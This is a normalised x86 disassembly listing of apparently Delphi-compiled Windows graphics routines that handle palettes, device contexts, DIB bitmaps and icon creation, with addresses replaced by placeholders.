cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4255fc
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028f0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_4253f4
mov eax esp
call sub_425564
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4256a0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_4253f4
mov [ esp ] eax
sub_4256f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_42509c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_42507c
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4258a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424f0c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4257c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424f1c
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257cd
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424e10
sub_4257cd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_42509c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424f0c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425880
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424f1c
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425887
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4258bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_42594c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407d40
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_425c43
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_425a35
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424e10
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a3c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425a3c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_4258b0
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407d40
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_425c23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4256f4
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407d40
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425c00
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c07
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402714
retn
call sub_424e64
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_4258b0
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_4258bc
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_425c54
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424df8
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c84
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_42509c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425d38
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_425c54
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425da4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_425c54
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425e41
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e48
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425e78
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c84
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c84
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425e6c
xor edx edx
push ebp
push sub_426066
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425d38
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425d38
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42603f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407d40
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407d40
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407d40
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407d40
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425da4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425da4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426046
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402714
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402714
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402714
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402714
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426046
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42606d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_426074
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4260c4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_42611c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_4260c4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426165
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031b8
mov edi eax
mov eax esi
call sub_4031b8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42629f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426282
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407e6c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426289
mov al 0x1
sub_4262b8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ae1c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426300
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426307
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_42630c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426340
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ae1c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42638b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426392
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_426454
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418914
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4264f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264f9
mov eax [ rw-data ]
call sub_418978
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4264ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4265e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424a18
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418550
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4249bc
test al al
je r-xdata
sub_426500
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418914
mov esi eax
xor ecx ecx
push ebp
push sub_426570
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax esi
call sub_418550
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4265e4
sub_42657c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424234
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4265b8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_4265e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4242f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4265e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42482c
xor edx edx
push ebp
push sub_426678
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424ba0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a18
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_426684
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42482c
xor eax eax
push ebp
push sub_426763
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4279a0
mov eax [ ebp - 0x4 ]
